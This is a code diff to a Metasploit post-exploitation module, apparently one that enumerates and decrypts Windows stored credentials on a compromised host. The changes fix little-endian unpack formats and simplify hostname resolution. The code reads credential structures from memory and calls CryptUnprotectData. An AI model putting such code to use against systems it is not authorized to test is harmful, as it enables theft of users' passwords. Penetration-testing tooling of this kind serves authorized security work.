@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Post
     if is_86
       addr = [data].pack("V")
     else
-      addr = [data].pack("Q")
+      addr = [data].pack("Q<")
     end
     return addr
   end
@@ -95,7 +95,7 @@ class Metasploit3 < Msf::Post
       len,add = ret["pDataOut"].unpack("V2")
     else
       ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
-      len,add = ret["pDataOut"].unpack("Q2")
+      len,add = ret["pDataOut"].unpack("Q<2")
     end
 
     #get data, and return it
@@ -107,32 +107,11 @@ class Metasploit3 < Msf::Post
     #check for valid ip and return if it is
     return hostorip if Rex::Socket.dotted_ip?(hostorip)
 
-    #convert hostname to ip and return it
-    hostip = nil
-    if client.platform =~ /^x64/
-      size = 64
-      addrinfoinmem = 32
-    else
-      size = 32
-      addrinfoinmem = 24
-    end
-
     ## get IP for host
-    begin
-      vprint_status("Looking up IP for #{hostorip}")
-      result = client.railgun.ws2_32.getaddrinfo(hostorip, nil, nil, 4 )
-      if result['GetLastError'] == 11001
-        return nil
-      end
-      addrinfo = client.railgun.memread( result['ppResult'], size )
-      ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
-      sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
-      ip = sockaddr[4,4].unpack('N').first
-      hostip = Rex::Socket.addr_itoa(ip)
-    rescue ::Exception => e
-      print_error(e.to_s)
-    end
-    return hostip
+    vprint_status("Looking up IP for #{hostorip}")
+    result = client.net.resolve.resolve_host(hostorip)
+    return result[:ip] if result[:ip]
+    return nil if result[:ip].nil? or result[:ip].empty?
   end
 
   def report_db(cred)
@@ -198,14 +177,14 @@ class Metasploit3 < Msf::Post
       #read array of addresses as pointers to each structure
       raw = read_str(p_to_arr[0], arr_len, 2)
       pcred_array = raw.unpack("V*") if is_86
-      pcred_array = raw.unpack("Q*") unless is_86
+      pcred_array = raw.unpack("Q<*") unless is_86
 
       #loop through the addresses and read each credential structure
       pcred_array.each do |pcred|
         cred = {}
         raw = read_str(pcred, 52,2)
-        cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
-        cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
+        cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
+        cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
         cred["flags"] = cred_struct[0]
         cred["type"] = cred_struct[1]
         cred["targetname"] = read_str(cred_struct[2],512, 1)
